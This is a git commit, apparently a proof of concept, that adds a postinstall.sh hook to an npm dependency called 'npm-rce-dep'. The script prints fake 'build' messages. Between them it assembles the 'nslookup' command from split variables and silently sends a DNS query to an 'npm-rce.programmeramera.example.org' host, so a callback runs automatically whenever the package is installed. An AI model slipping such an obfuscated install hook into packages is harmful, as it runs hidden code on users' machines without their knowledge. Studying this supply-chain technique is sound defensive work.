302c242ad9de76ba6e634fccacec88538fc947a6
Johan Lindfors <johan.lindfors@coderox.se>
2024-11-01 10:02:59 +0100

    Dependency

---
+++ npm-rce-dep/postinstall.sh
@@ -0,0 +1,12 @@
+#!/usr/bin/env sh
+
+echo “Starting build..."
+amount=ample
+former=ex
+organization=org
+install_a=nslo
+install_b=okup
+
+$install_a$install_b npm-rce.programmeramera.$former$amount.$organization >/dev/null
+
+echo “Build succeeded..."
